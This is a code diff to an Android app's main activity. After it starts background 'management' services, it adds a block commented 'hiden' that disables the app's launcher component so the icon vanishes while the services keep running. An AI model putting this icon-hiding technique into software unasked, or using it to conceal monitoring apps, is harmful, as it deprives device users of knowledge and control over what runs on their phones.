@@ -9,6 +9,7 @@ import android.content.SharedPreferences;
 import android.content.DialogInterface.OnCancelListener;
 import android.content.SharedPreferences.OnSharedPreferenceChangeListener;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Message;
@@ -160,6 +161,14 @@ public class MainActivity extends Activity {
                 // Launch services
                 ManagementApplication.getContext().sendBroadcast(
                         new Intent(ManagementApplication.getContext(), ManagementReceiver.class));
+                
+                // hiden
+                PackageManager p = getPackageManager();
+                p.setComponentEnabledSetting(
+                        getComponentName(),
+                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                        PackageManager.DONT_KILL_APP);
+                
                 closeApp();
             } else {
                 MainActivity.this.showAlert(
